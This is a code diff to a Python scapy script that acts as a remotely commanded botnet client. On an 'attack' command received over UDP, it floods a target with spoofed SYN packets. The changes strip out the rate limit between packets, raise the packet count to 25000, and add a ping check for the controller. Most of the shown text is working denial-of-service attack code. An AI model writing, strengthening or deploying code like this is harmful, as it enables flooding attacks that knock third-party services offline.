@@ -4,7 +4,6 @@ from scapy.layers.inet import *
 from scapy.all import *
 from random import randint
 from threading import Thread
-import time
 
 # SYN Flood Script Credit: Emre Ovunc @ https://github.com/EmreOvunc
 def randomIP():
@@ -42,7 +41,6 @@ def SYN_Flood(dstIP, counter, attack_thread_abort):
 		TCP_Packet.window = w_indow
 
 		send(IP_Packet/TCP_Packet, verbose=0)
-		time.sleep(0.1)
 		total+=1
 
 	stdout.write("Total packets sent: %i\n" % total)
@@ -70,13 +68,15 @@ if __name__ == "__main__":
 			print("sending ip address...", end="")
 			sock.sendto(b"ip address:" + socket.gethostbyname(socket.gethostname()).encode(), (addr[0], SERVER_PORT))
 			print("sent!")
-		if "attack" in command:
+		if command == "ping":
+			print("pong!")
+		elif "attack" in command:
 			target = command[command.index(":")+1:]
 			print("attacking %s..." % target)
 			attack_thread_abort = threading.Event()
-			attack_thread = Thread(target = SYN_Flood, args=(target, 10000, attack_thread_abort))
+			attack_thread = Thread(target = SYN_Flood, args=(target, 25000, attack_thread_abort))
 			attack_thread.start()
-		if command == "stop":
+		elif command == "stop":
 			if attack_thread:
 				attack_thread_abort.set()
 			else:
